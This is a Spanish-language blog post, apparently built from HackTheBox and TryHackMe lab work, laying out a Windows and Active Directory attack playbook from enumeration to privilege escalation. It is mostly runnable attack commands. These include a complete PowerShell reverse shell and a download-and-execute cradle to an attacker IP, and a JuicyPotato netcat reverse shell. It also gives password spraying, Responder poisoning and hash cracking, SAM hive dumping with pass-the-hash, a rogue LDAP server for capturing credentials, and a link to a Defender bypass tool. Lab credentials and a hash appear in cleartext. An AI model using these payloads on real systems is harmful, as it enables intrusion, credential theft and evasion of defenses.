---
layout: post
author: Sergio Salgado
---

## [](#header-2)Indice
- <a href="#introduccion">Introduccion</a>
- <a href="#reconocimiento">Reconocimiento</a>
- <a href="#enumeracion">Enumeracion</a>
- <a href="#explotacion">Explotacion</a>
- <a href="#hardening">Hardening</a>

## [](#header-2)<a id="introduccion">Introduccion</a>
Un analisis de vulnerabilidades exitoso consiste en desarrollar una metodologia util para su ejecucion, en este post el objetivo es plasmar las herramientas vistas en el Libro Hacking Exposed Windows; a su vez actualizare la manera que se puede usar las herramientas desde kali Linux 2022 y tambien poner en que maquinas se ha utilizado en HtB para poder ejemplificar de manera correcta dichas acciones.

## [](#header-2)<a id="reconocimiento">Reconocimiento</a>

La primera herramienta seria ver como responde el DNS del objetivo con la herramienta whois, que viene instalada en Kali predeterminadamente

```s
whois 192.168.30.15
```

Si el objetivo esta expuesto a la red, podemos emplear OSINT con Shodan, Google, etc.

Podemos hacer un banner grabbing con netcan de la manera siguiente:

```s
nc -vv server 80
```

Para obtener el sistema operativo base, bastara con un ping. Los paquetes ttl 64 significa que es linux y 128 significara que nos presentamos ante una Windows

Con nmap podemos tambien descubrir equipos aledanos o puertos expuestos, *hay que tener en cuenta que este escaneo es muy ruidoso y se puede bloquear la conexion* los comandos que suelo utilizar son:

```s
#Para descurbir mas hosts
sudo nmap 10.10.11.170/24

#Escaneo rapido
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.170

#Escaneo rapido con informacion de los puertos
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.170 -oG allPorts

#Escaneo sobre los puertos descubirtos
sudo nmap -sCV -p22,8080 10.10.11.170 -oN targeted

#Escaneo sobre UDP
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.116
```

## [](#header-2)<a id="enumeracion">Enumeracion</a>
Para tener un enfoque mas atinado, necesitamos tener una idea de que servicios son los que se descuidan en su configuracion normalmente. 

Los servicios de Windows tipicamente atacados son:

| #  |        **Name**                            | **PORT** |
|:---|:-------------------------------------------|:---------|
| 1  | DNS zone transfer                          | 53       |
| 2  | Microsoft RPC                              | 135      |
| 3  | NetBIOS Name Service (NBNS)                | 137      |
| 4  | NetBIOS session service (SMB over NetBIOS) | 139      |
| 5  | SMB over TCP (Direct Host)                 | 445      |
| 6  | Simple Network Management Protocol (SNMP)  | 161      |
| 7  |Lightweight Directory Access Protocol (LDAP)| 389      |
| 8  |Global Catalog Service                      | 3268     |
| 9  | Terminal Services                          | 3389     |

NetBIOS enumeration
Para obtener la tabla de nombres de netBIOS de una maquina remota
nbtstat -a <IP add>

Para obtener el contenido de la cache de la tabla de netBIOS y las IP de resolucion, usado en investigaciones forences 
```s
nbtstat -c
```
Para enumerarlo con nmap 
```s
nmap -sV -v --script nbstat.nse <IP add>
```
Otra herramienta con interfaz gráfica para este protocolo es NetBIOS, Usuarios, Domain Names y MAC adrresses es  "NetBIOS Enumerator"

Enumeracion de Usuarios
Existe un repositorio de herramientas remotas y de linea de comandos llamadas PsTools 
- PsExec ejecuta procesos remotamente
- PsGetSid despliega el SID de una computadora o usuario
- PsLoggedOn muestra quien esta loggeado localmente y via recursos compartidos
- PsFile muestra los archivos abiertos remotamente
- PsKill cierra procesos mediante el nombre o ID del proceso
- PsInfo Informacion del sistema
- PsList Lista informacion detallada sobre los procesos
- PsLogList para hacer dump de los logs guardados
- PsPasswd cambia las contraseñas de usuarios
- PsShutdown Apaga y opcionalmente reinicia la computadora

Enumeracion de Recursos Compartidos usando NetView
Para detectar equipos en la red
```s
net view \\<IP add> /ALL
net view /domain:<domain name>
```

Conexion al recurso compartido con usuario null
```s
net use \\<IP add>\ipc$ "" /u:""
```
Enumeracion de SNMP
Incluso snmp v3 cuenta con vulnerabilidades. Como funciona es que el string public tiene permisos de lectura, un string privado tiene permisos de lectura y escritura. Al hacer sniffing de red se podría interceptar esta informacion.
Existe la herramienta snmpwalk
```s
snmpwalk -v1 -c public <IP add>
```

Existe un programa para revisar el snmp llamada snmp-check https://github.com/superzero10/snmp-check.git
```s
snmp-check 10.10.11.48 
```
Para la enumeracion con nmap, podemos llegar a encontrar nombres de usuarios, equipos, servicios corriendo.
```s
nmap -sU -p 161 --script=snpm-process <IP add>
```

Enumeracion de LDAP
Softerra LDAP Administrator provee de varias funcionalidades escenciales para el desarrollo LDAP como scripts de python

ldapsearch lo usan los atacantes para enumerar 

Enumeracion de NTP
Si los relojes no estan sincronizados, no se puede iniciar sesion mediante kerberos y puede haber un DOS, los atacantes consultan el servicio para obtener informacion util como hosts conectados, client addresses en la red, sus nombres y OSs, IPs internas si el NTP esta en la DMZ
Las herramientas a usar son:
```s
ntptrace
ntpdc
ntpq
```
Enumeracion de NFS
Se usan las herramientas:
```s
showmount -e <IP add>

rpcinfo -p 10.10.1.19
```
RPCscan se comunica con los servicios de rpc y hace un check de las misconfigurations en los recursos compartidos de NFS
```s
rpc-scan.py <IP add> --rpc
```
SuperEnum incluye un script para hacer la enumeracion basica de cualquier puerto abierto
```s
./superenum Running script
```

Enumeracion de SMTP
SMTP puerto 25 nos provee de 3 comandos
VRFY - Validate users
EXPN - Muestra la direccion actual de entrega de los alias y listas de correos
RCP TO - Define los recipientes del mensaje
Aqui podemos usar telnet para hacer un banner grabbing y extraer informacion de los 3 comandos anteriores
```s
telnet <IP add> 25
```
Nmap tiene muchos scripts para esta enumeracion, en el ejemplo se usa:
```s
nmap -p 25 --script=smtp-enum-users 10.10.1.19
```
metasploit tiene tambien un modulo auxiliar para esto
```s
smtp_enum
```
Enumeracion de DNS y zonas de transferencia
Si el DNS del objetivo permite la zona de transferencia, el atacante puede usar utilizar esta tecnica para obtener los nombres de servidores DNS, nombres de equipos, maquinas, direcciones I, alias, etc. 
Se utilizan herramientas como nslookup, dig, DNSReacon

DNSSEC Zone Walking
Esta tecnica es una enumeracion donde el atacante intenta obtener los records internos del servidor de DNS si el servidor de DNS no está configurado correctamente.
```s
ldns-walk @8.8.8.8 iana.org

./dnsrecon-py -d www.certifiedhacker.com -z
```

Usando nmap
```s
nmap --script=broadcast-dns-service-discovery certifiedhacker.com
nmap -sU -p 53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=certifiedhacker.com 162.159.25.175
```
Enumeracion de IPsec
Se puede usar para extraer informacion como algoritmos de encriptacion y hasheo, tipos de autenticacion, algoritmos de distribucion de llaves y SA LifeDuration
```s
nmap -sU -p 500 <IP add>

ike-scan -M <IP add>
```
Enumeracion de VoIP
```s
svmap <IP add>

auxiliary/scanner/sip/enumerator
```

Enumeracion de usuarios de Unix/Linux
```s
rusers Muestra una lista de usuarios que estan loggeados en las maquinas remotas o en las maquinas de la red local
rwho Muestra una lista de usuarios que estan loggeados en los hosts de la red local
finger Muestra informacion sobre los usuarios de sistema, como login name, real name, terminal name, idle time, login time, office location y numeros de telefono de oficina
```

Enumeracion de Telnet y SMB
```s
nmap -p 23 10.10.1.19
```
SMBMap, smbclient enum4linux  nullinux, para hacer un escaneo directo a SMB
```s
nmap -p 445 -A 10.10.1.19

sudo nmap -p 445 --script smb-protocols 10.129.232.227 -oN nmap_smb_protocols.txt
sudo nmap -p 139 --script smb-protocols 10.129.232.227 -oN nmap_smb_protocols.txt

#Listar los directorios que tienen credenciales nulas
smbclient -L 10.129.232.227 -N
#Podemos navegar dentro de la carpeta encontrada con el dominio del DC
smbclient -N //cicada.htb/HR
#Para ver los permisos de las carpetas compartidas
smbmap -H 10.129.232.227
#Para entrar a una carpeta
smbmap -H 10.129.232.227 -r [Carpeta]
#Para descargarnos un archivo
smbmap -H 10.129.232.227 --download [Carpeta/Archivo]

smbmap -H 10.129.232.227 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users

#listar informacion de una lista de usuarios
perl ~/Downloads/enum4linux-0.9.1/enum4linux.pl -A -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' -k $(cat users.txt | tr '\n' ',' | sed 's/,$//') 10.10.11.35

```

Enumeracion de FTP TFTP
las transferencias de la informacion son en texto plano y se pueden interceptar informacion como nombres de usuario y contraseñas.
FTP bounce, FTP brute force y packet snifing
```s
nmap -p 21 www.certifiedhacker.com
```
Para TFTP(Puerto 69) existen herramientas como PortQry y Nmap

Un paso importante para las pruebas, es intentar descargar archivos recursivamente, estan los comandos:
```s
wget -m ftp://anonymous:anonymous@10.129.232.230
wget -m --no-passive ftp://anonymous:anonymous@10.129.232.230
```

### [](#header-3)<a id="user_enum">Username Enumeration</a>

Tenemos la utilidad GetNPUsers
```s
python3 GetNPUsers.py active.htb/ -no-pass -usersfile users.txt
```
Se pueden enumerar usuarios validos mediante kerbebrute, que escencialmente explota como Kerberos responde ante un usuario valido.
```s
kerbrute_linux_386 userenum --dc 10.10.10.192 -d Mailing.local /usr/share/wordlists/SecLists/Usernames/Names/names.txt --safe -v
```

En el comando, Mailing.local es el domain del Active directory y users.txt es la lista de usuarios a probar.


**Nota** El reloj de la maquina debera estar cincronizado, si no esta, existe la utilidad siguiente para sincronizarlo:
```s
ntpdate 10.129.232.227
```

Tenmos tambien la utilidad GetUsersSPNs.py

Otra alternativa más rapida podría ser un modulo de metasploit 
```s
msf5 auxiliary(gather/kerberos_enumusers) >
```
Podriamos recibir resultados identicos pero las opciones más estables son kerbrute o Impacket <a href="http://getnpusers.py/"> GetNPUsers.py.</a>

Una vez tengamos un usuario y contrasena, GetNPUsers nos puede ayudar para solicitar un ticket de kerberos en caso de que este activo.

### [](#header-3)<a id="netbios_enum">Enumeracion de NETBIOS</a>
El primer paso, sera descubrir si existe un dominio presente, este escaneo es pasivo y el comando a ejecutar desde una maquina windows seria:

```s
C:\>net view /domain
```
## [](#header-2)<a id="reconocimiento">Initial Access</a>
Fuerza bruta de contrasenas SMB y SHH
```s
#en mi maquina parrot tengo esta utilidad como cme
#Con lista de usuarios y contrasenas
crackmapexec smb 10.10.10.184 -u users -p credentials --continue-on-success
#Podemos usar esta herramienta para enumerar usuarios de la forma 
crackmapexec smb cicada.htb -u "guest" -p '' --rid-brute | grep SidTypeUser
#Si la respuesta anterior da positivo, podemos usar este comando para guardar los usuarios
cme smb cicada.htb -u "guest" -p '' --rid-brute | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 >> users.txt

crackmapexec ssh 10.10.11.166 -u users -p password --continue-on-success

#validacion
crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'

#Listar los recursos compartidos con el nuevo usuario
cme smb 10.129.232.227 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
```

Teniendo una sesion valida, ahora podemos interactuar con la consola con evilwinrm
```s
evil-winrm -i 10.10.10.203 -u "nathen" -p "wendel98"
```

## [](#header-2)<a id="Breaching_ad">Breaching Active Directory</a>
NTLM Authenticated Services
New Technology LAN Manager (NTLM). Es el modo de autenticacion usado por varias tecnologias integradas en el AD, como Mail (Outlook Web App), accesos a RDP expuestos a internet, VPN que son integradas con AD, aplicaciones web que hacen uso de NetNTLM.
+(SOC protip) Este tipo de ataques se pueden detectar via multiples inicios de sesion fallidos que contienen el codigo 4265
Juega el rol de hombre en medio entre el cliente y el AD, Resolviendo un reto que solamente con la contraseña correcta se resolverá
-TEST
Brute-force Login Attacks
Password Spraying

LDAP Bind Credentials
Otro metodo de autenticación del AD es la autenticacion Lightweight Directory Access Protocol (LDAP). Es similar a la autenticación NTLM. Solamente que con este metodo, las credenciales de usuario se verifican directamente. La aplicacion usa primero un par de contraseñas que tiene para LDAP y despues verificar el usuario de AD.
Su uso es popular en aplicaciones como: Gitlab, Jenkins, Custom-developed web applications, Printers, VPNs.
Es posible usar los mismos ataques que se usaron en NTLM. Si se obtiene acceso a un servidor de Gitlab por ejemplo, podría ser posible obtener las credenciales de AD, ya que normalmente se almacenan en texto plano.
-TEST
LDAP Pass-back Attacks
Cuando se obtiene acceso a la red local o a la aplicacion web. Redirigiendo la autenticacion a nuestro dispositivo maligno podremos interceptar estas credenciales de LDAP.
Para realizar este ataque, usaremos 
```s
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
sudo dpkg-reconfigure -p low slapd
```

La configuracion de nuestro servidor LDAP tendrá vulnerabilidades para obligar a que se compartan las claves en texto plano.

```s         
#Nombre del archivo: olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred

    olcSaslSecProps: Specifies the SASL security properties
    noanonymous: Disables mechanisms that support anonymous login
    minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.
```

Para inciarlo  ejecutamos el comando
```s
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

Para probar su funcionamiento:
```s
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

Una vez configurado correctamente, podemos obtener las credenciales con un
```s
sudo tcpdump -SX -i breachad tcp port 389
```

Authentication Relays
Continuando con los metodos de autenticación, existen numerosos servicios que hablan entre si para permitir a los usuarios el uso de los mismos. En esta ocacion veremos el servicio de SMB (Server Message Block) el cual permite a los clientes como workstations comunicarse con el servidor.
-TEST
Intercepting NetNTLM Challenge
En esta parte usaremos un programa que se llama responder, el cual interceptará el reto NetNTLM para crackearlo, ya que usualmente hay demasiados packetes de estos sobre la red. En un entorno normal, responder puede envenenar cualquier peticion de Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS) o Web Proxy Auto-Discovery (WPAD). Responder se encuentra en el  <a href=" https://github.com/lgandx/Responder">link</a>.
Su forma de uso será:
```s
sudo responder -I tun0
```

Una vez obtenido el archivo NTLMv2-SSP Hash, podemos crackear las contraseñas con
```s
hashcat -m 5600 <hash file> <password file> --force
```

Relaying the Challenge (Reenvio del reto)
Para poder reenviar este ataque, se tienen que cumplir varias condiciones que se obtienen con la enumeración de los activos:
1. El firmado por SMB debera estar deshabilitado o habilitado, pero no reforzado. 
2. La cuenta asociada deberá contar con los permisos necesarios para acceder a los recursos solicitados.

Microsoft Deployment Toolkit
En las organizaciones no se debería tener a los empleados de TI portar USBs y DVDs para instalar programas, para eso usarían herramientas como el Developer Kit y es aquí donde explotaremos las vulnerabilidades que este tipo de soluciones contienen. 
Microsoft Deployment Toolkit (MDT) nos ayudará a mantener las imagenes del OS en una ubicacion centralizada y actualizada; normalmente esta herramienta está integrada con Microsoft Deployment Toolkit (MDT), quien gestiona las actualizaciones de Microsoft.
En este ejemplo se tomará en cuenta Preboot Execution Environment (PXE) boot.
El archivo normalmente se encuentra en la carpeta TMP. Y podemos acceder a el con la <a href="https://github.com/wavestone-cdt/powerpxe">herramienta</a> , o con powershell:
```s
C:\Users\THM\Documents\Am0> powershell -executionpolicy bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.   

PS C:\Users\THM\Documents\am0> Import-Module .\PowerPXE.ps1
PS C:\Users\THM\Documents\am0> $BCDFile = "conf.bcd"
PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : <PXE Boot Image Location>
<PXE Boot Image Location>
```

Nuestro objetivo será encontrar un archivo llamado bootstrap.ini y ahi estarán las credenciales de acceso a AD.
Para mas informacion sobre este ataque, visitemos el link <a href="https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps">herramienta</a> 

Configuration Files
La última enumeracion posible que exploraremos son los archivos de configuración. En dado caso de que podamos acceder a una maquina, podremos recuperar las credenciales de AD, dependiendo del proposito del host, podremos encontrar estas en diferentes lugares como: Archivos de configuracion de Aplicaciones Web,  Archivos de configuracion de servicios, Llaves de registro, Apliaciones desplegadas centralmente. Existen herramientas para enumerar este ataque como <a href="https://github.com/GhostPack/Seatbelt">Seatbelt</a> 


## [](#header-2)<a id="Enumerating_ad">Enumerating Active Directory</a>
Hacking
El objetivo principal va a ser obtener la SAM, que es el equivalente al archivo /etc/shadow de Linux, el cual se encuentra en la ruta C:\windows\system32\config\SAM
La estructura del archivo de la SAM es Username:User ID:LM Hash:NTLM Hash  ejemplo:

Guest:501:NO PASSWORD*************:NO PASSWORD*************:::
Shiela:1005:NO PASSWORD*************:0CB6948805F797BF2A82807973B89537
En esta parte se explicará la herramienta binaria llamada runas.exe.
Si alguna vez haz tenido credenciales de AD, pero no haz podido logearte con ellas, esta es la solucion. Si tenemos las credenciales de AD en el formato :, podremos usar Runas, un comando comun de runas.exe luce como:
```s
runas.exe /netonly /user:<domain>\<username> cmd.exe
```

Let's look at the parameters:

    /netonly - Since we are not domain-joined, we want to load the credentials for network authentication but not authenticate against a domain controller. So commands executed locally on the computer will run in the context of your standard Windows account, but any network connections will occur using the account specified here.
    /user - Here, we provide the details of the domain and the username. It is always a safe bet to use the Fully Qualified Domain Name (FQDN) instead of just the NetBIOS name of the domain since this will help with resolution.
    cmd.exe - This is the program we want to execute once the credentials are injected. This can be changed to anything, but the safest bet is cmd.exe since you can then use that to launch whatever you want, with the credentials injected.

Una vez dentro del sistema, podemos listar los Volumenes, uno de los mas comunes en listar es el SYSVOL, el cual almacena las GPOs e informacion relacionada con el dominio.
*Antes de empezar a listar el SYSVOL*, es necesario configurar el DNS, con lo siguiente:
```s
$dnsip = "<DC IP>"
$index = Get-NetAdapter -Name 'Ethernet' | Select-Object -ExpandProperty 'ifIndex'
Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip
```

ADVMonitoreoIP vs Hostnames
Existe una pequeña diferencia entre los comandos 
```s
dir \\za.tryhackme.com\SYSVOL 
dir \\<DC IP>\SYSVOL
```
Mientras que con el primer ejemplo podemos forazar a que se realice una autenticación mediante kerberos, con el segundo podemos forzar una autenticación NTLM.

Enumeracion via consola de administracion de Windows.
Es posible enumerar el contenido del directorio activo mientras un equipo está unido al dominio. Para hacerlo, se listan los pasos a seguir.
1.1 Instalar los Snaps-in de Directorio Activo
    Press Start
    Search "Apps & Features" and press enter
    Click Manage Optional Features
    Click Add a feature
    Search for "RSAT"
    Select "RSAT: Active Directory Domain Services and Lightweight Directory Tools" and click Install

1.2 Iniciamos MMC con Windows+x y colocamos MMC (Si  no estamos unidos al dominio no podremos continuar. Necesitamos lo anterior para poder inyectar las credenciales al menos)
1.3 En el MMC podremos ahora enlazar el RSAT Snap-in con los pasos siguientes:
Click File -> Add/Remove Snap-in
Select and Add all three Active Directory Snap-ins
Click through any errors and warnings
Right-click on Active Directory Domains and Trusts and select Change Forest
Enter za.tryhackme.com as the Root domain and Click OK
Right-click on Active Directory Sites and Services and select Change Forest
Enter za.tryhackme.com as the Root domain and Click OK
Right-click on Active Directory Users and Computers and select Change Domain
Enter za.tryhackme.com as the Domain and Click OK
Right-click on Active Directory Users and Computers in the left-hand pane
Click on View -> Advanced Features

1.4 Si todo marcha bien, podremos empezar a enumerar usuarios, maquinas en el directorio activo.

Enumeración vía Command Prompt
Algunas vecxes es necesario la enumeracion por comandos, si es que se entra a un sistema por medio de algun troyano. Es suficiente el cmd para listar información util.
La primera herramienta que podemos usar es "net", la cual nos permite enumerar informacion util local y del AD.
Usuarios
Para traernos los usuarios en el dominio y dimensionar el tamaño del AD.
```s
net user /domain
```
Para traer la información sobre solo un usuario
```s
net user zoe.marshall /domain
```
Informacion de grupos
```s
net group /domain
net group "Tier 1 Admins" /domain
```
Informacion de politica de contraseñas
```s
net accounts /domain
```

Para más usos del comando net, esta el sitio https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems

Enumeración vía PowerShell
Enumeracion de usuarios
```powershell
Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *
```
Podemos mejorar la salida de esta consulta agregando
```powershell
| Format-Table Name,SamAccountName -A
Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com  | Format-Table Name,SamAccountName -A
```

Enumeración de Grupos
```powershell
Get-ADGroup -Identity Administrators -Server za.tryhackme.com 
```
Podemos tambien listar quienes pertenecen al grupo con:
```powershell
Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com 
```
Objetos de directorio Activo
Objetos cambiados del directorio activo en una fecha especifica
```powershell
$ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com
```
Si queremos hacer un ataque de contraseñas sin bloquear a los usuarios, podemos el siguiente comando:
```powershell
Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
```
Informacion del Dominio
```powershell
Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
```
Alterar Objetos de AD
Esta parte se cubre en Explotacion de AD, pero un ejemplo de cambio de contraseña para los usuarios es:
```powershell
Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
```
Enumeración vía BloodHound
BloodHound es la herramienta desarrollada por el mismo Microsoft, diseñada para averiguar las brechas o nodos para poder llegar a ser Administradores en un Dominio.
El colector de la informción se llama Sharphound y sus variantes son
Sharphound.ps1 que es el ejecutable de PowerShell, Sharphound.exe que es el ejecutable de Windows, AzureHound.ps1 es el ejecutable para powershell del entorno de Azure y obtener la identidad de Azure o el Acceso a la Administración de este.

*Nota, las versiones de BloodHound y SharpHound deberán coincidir para tener resultados eficientes.

Ejecutaremos Sharphound con el comando siguiente:
```powershell
Sharphound.exe --CollectionMethods <Methods> --Domain za.tryhackme.com --ExcludeDCs
```
Parameters explained:

    CollectionMethods - Determines what kind of data Sharphound would collect. The most common options are Default or All. Also, since Sharphound caches information, once the first run has been completed, you can only use the Session collection method to retrieve new user sessions to speed up the process.
    Domain - Here, we specify the domain we want to enumerate. In some instances, you may want to enumerate a parent or other domain that has trust with your existing domain. You can tell Sharphound which domain should be enumerated by altering this parameter.
    ExcludeDCs -This will instruct Sharphound not to touch domain controllers, which reduces the likelihood that the Sharphound run will raise an alert.

Los parámetros de Sharphound se encuentran en https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html

Ahora tenemos una herramienta que nos ayudara mas rapido con la enumeracion de bloodhound, se llama nxc y la podemos usar de la forma:
```s
nxc ldap dc01.certified.htb -u judith.mader -p judith09 --bloodhound --collection All --dns-tcp --dns-server 10.10.11.41
```
Descarga de archivos con powershell

```powershell
START /B "" powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.2:9001/shell.ps1')
```

.bat Para ejecutar el comando anterior
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.2',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
## [](#header-2)<a id="Privilege_escalation">Privilege escalation</a>
Acabo de encontrar una herramienta que te ayuda a hacer bypass del edr de Defender que se llama https://github.com/Adkali/PowerJoker.git.

Manualmente, tenemos el comando whoami, pero en esta ocacion con los privilegios posibles:
```s
whoami /all
whoami /priv
```
En este ejemplo 1 tenemos como respuesta el privilegio de SeImpersonatePrivilege, el cual se explota de la forma:

```s
#Descargamos Juicy Potato de github, esta herramienta nos va a permitir inyectar comandos privilegiados
git clone https://github.com/ohpe/juicy-potato.git
#Descargamos el netcan de x64 o x86 
#Abrimos un servidor de python para traernos los archivos
python3 -m http.server 8080

#Nos descargamos los archivos en la victima con
certutil.exe -f -urlcache -split http://10.10.14.29:8080/[Archivos]

#Usamos JuicyPotato con -l {Puerto que sea}, y en este caso abriremos un cmd privilegiado, -a pasandole los argumentos de 
.\JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd 10.10.14.29 4646"

#Nos ponemos en escucha desde la maquina atacante
nc -nlvp 4646
```

Ejemplo 2, explotacion del privilegio SeBackupPrivilege
```s
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system

download sam
download system
#Usaremos pypykatz para obtener el valor del hash del admin

pypykatz registry --sam sam system
#Con esto ya podemos iniciar una sesion de evil-winrm
evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```

Ejemplo 3, explotacion de RSA_4810
Para detectarlo usaremos:  <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1?source=post_page-----ecbaec77e161--------------------------------">PowerView</a>

```s
. ./PowerView.ps1

Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "nu_1055"}
```
![Vulnerabilidad de grupo RSA_4810](/assets/images/Hacking-Windows/vul.png)

Para explotarlo usaremos SPN-Jacking attack
```s
Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='test/tester'}
Get-DomainSPNTicket -SPN test/tester
```
Obtendremos el TGS ticket y ahora podemos usar john para hacer una fuerza bruta del ticket.

Parte de la enumeracion, tenemos el comando
```s
cmdkey /list
```
Aqui en la enumeracion podemos ver que las credenciales de Administrador estan guardadas para ejecutar runas por ejemplo, maquina Access para mas info. Donde se clonara el proyecto Nishang/Shells/Invoke-PowershellTcp.ps1.

En la enumeracion, podemos ver los scripts de dominio y encontrar permisos de escritura dentro de alguna de las carpetas a algun usuario que tengamos
```s
cd Windows\sysvol\domain\scripts
icacls 11DBDAEB100D
icacls A2BFDCF13BB2
icacls A32FF3AEAA23
```
Ahora solo tendriamos que cambiar los permisos del exploit.bat
```s
Set-ADUser -Identity SSA_6010 -ScriptPath "exploit.bat"
```

Podemos usar una tool que nos sugiere como explotar un cve para la escalada d elos privilegios
https://github.com/AonCyberLabs/Windows-Exploit-Suggester

#Primero instalamos las dependencias
python -m pip install xlrd
#Actualizamos la base de datos con 
windows-exploit-suggester.py --update

Si tenemos contrasenas y usuarios validos, podemos intentar una conexion con rpcclient
```s
rpcclient 10.129.232.227 -U 'SVC_TGS%GPPstillStandingStrong2k18'
rpcclient 10.129.232.227 -U 'SVC_TGS%GPPstillStandingStrong2k18' -c 'enumdomusers'

enumdomgroups
querygroupmem [rid]
queryuser [rid]
querydispinfo
```

## [](#header-2)<a id="Post_priv_escalation">Post priv escalation</a>


Las credential filenames tienen una cadena de 32 caracteres como por ejemplo: "85E671988F9A2D1981A4B6791F9A4EE8" y las masterkeys son un GUID como "cc6eb538-28f1-4ab4-adf2-f5594e88f0b2", para encontrarlas tenemos el comando:
```shell
cmd /c "dir /S /AS C:\Users\security\AppData\Local\Microsoft\Vault & dir /S /AS C:\Users\security\AppData\Local\Microsoft\Credentials & dir /S /AS C:\Users\security\AppData\Local\Microsoft\Protect  & dir /S /AS C:\Users\security\AppData\Roaming\Microsoft\Vault & dir /S /AS C:\Users\security\AppData\Roaming\Microsoft\Credentials & dir /S /AS C:\Users\security\AppData\Roaming\Microsoft\Protect"
```
Las credenciales y masterkey estan en base64, podemos regresarlas a su orden normal con mimikats https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials


# Initial Enumeration 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `nslookup ns1.inlanefreight.com`                             | Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host. |
| `sudo tcpdump -i ens224`                                     | Used to start capturing network packets on the network interface proceeding the `-i` option a Linux-based host. |
| `sudo responder -I ens224 -A`                                | Used to start responding to & analyzing `LLMNR`, `NBT-NS` and `MDNS` queries on the interface specified proceeding the` -I` option and operating in `Passive Analysis` mode which is activated using `-A`. Performed from a Linux-based host |
| `fping -asgq 172.16.5.0/23`                                  | Performs a ping sweep on the specified network segment from a Linux-based host. |
| `sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum` | Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (`-A`) based on a list of hosts (`hosts.txt`) specified in the file proceeding `-iL`. Then outputs the scan results to the file specified after the `-oN`option. Performed from a Linux-based host |
| `sudo git clone https://github.com/ropnop/kerbrute.git`      | Uses `git` to clone the kerbrute tool from a Linux-based host. |
| `make help`                                                  | Used to list compiling options that are possible with `make` from a Linux-based host. |
| `sudo make all`                                              | Used to compile a `Kerbrute` binary for multiple OS platforms and CPU architectures. |
| `./kerbrute_linux_amd64`                                     | Used to test the chosen complied `Kebrute` binary from a Linux-based host. |
| `sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute`       | Used to move the `Kerbrute` binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool. |
| `./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results` | Runs the Kerbrute tool to discover usernames in the domain (`INLANEFREIGHT.LOCAL`) specified proceeding the `-d` option and the associated domain controller specified proceeding `--dc`using a wordlist and outputs (`-o`) the results to a specified file. Performed from a Linux-based host. |



# LLMNR/NTB-NS Poisoning 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `responder -h`                                               | Used to display the usage instructions and various options available in `Responder` from a Linux-based host. |
| `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt` | Uses `hashcat` to crack `NTLMv2` (`-m`) hashes that were captured by responder and saved in a file (`frond_ntlmv2`). The cracking is done based on a specified wordlist. |
| `Import-Module .\Inveigh.ps1`                                | Using the `Import-Module` PowerShell cmd-let to import the Windows-based tool `Inveigh.ps1`. |
| `(Get-Command Invoke-Inveigh).Parameters`                    | Used to output many of the options & functionality available with `Invoke-Inveigh`. Peformed from a Windows-based host. |
